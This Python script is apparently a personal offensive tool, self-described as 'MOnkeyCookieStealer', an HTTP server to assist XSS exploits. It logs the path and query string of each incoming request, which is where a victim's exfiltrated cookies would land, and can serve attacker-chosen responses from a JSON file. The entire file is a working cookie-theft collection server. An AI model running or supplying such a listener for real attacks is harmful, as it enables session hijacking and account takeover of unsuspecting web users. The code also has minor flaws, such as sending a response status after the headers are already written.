import os
import http.server
import argparse
from urllib.parse import urlparse
import socketserver
import json
import re
import datetime

custom_response={}
set_custom_response = False
class CustomHandler(http.server.SimpleHTTPRequestHandler):
    
    def set_HEADER(self):
        self.send_response(200)
        self.send_header("Content-type","text/html")
        self.end_headers()

    def do_GET(self):
        self.set_HEADER()
        query=urlparse((self.path)) 
        image = re.search(".*\.(jpeg|png|bmp)$",query.path)
        if image:
            print("looking for image")
            if(set_custom_response):
                html=custom_response["GET IMG"]["response"]
                encoded = html.encode("utf8")
                self.wfile.write(encoded)
            else:
                self.send_response(200)
        else:
            if(set_custom_response):
                html=custom_response["GET"]["response"]
                encoded = html.encode("utf8")
                
                self.wfile.write(encoded)
            else:
                self.send_response(200)
        return
    def log_message(self,format, *args):
        print("########")
        query=urlparse((self.path)) 
        date= datetime.datetime.now()
        print ("\t-Time: %s" %date )
        print("\t-path: ",query.path)
        print("\t-query: ",query.query)
        print("#######")
    


def main(ip,port):
    server_address = (ip,port)
    Handler = CustomHandler
    with socketserver.TCPServer(server_address, Handler) as httpd:
        try:
            print("serving at :",ip,port)
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("interrupting due to keyboard input")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
                    prog = 'MOnkeyCookieStealer',
                    description = 'Simple Http servor to help me during Xss exploit')
    parser.add_argument('ip')           # positional argument
    parser.add_argument('port')      # option that takes a value
    parser.add_argument("--response")
    args = parser.parse_args()
    print(args.response)
    if(args.response== None):
        main(args.ip,int(args.port))
    else:
        if(os.path.exists(args.response)):
            jsonfile= open(args.response)
            custom_response= json.load(jsonfile)
            set_custom_response= True
            main(args.ip,int(args.port))
        else:
            print("specified file for whitelist does not exist")
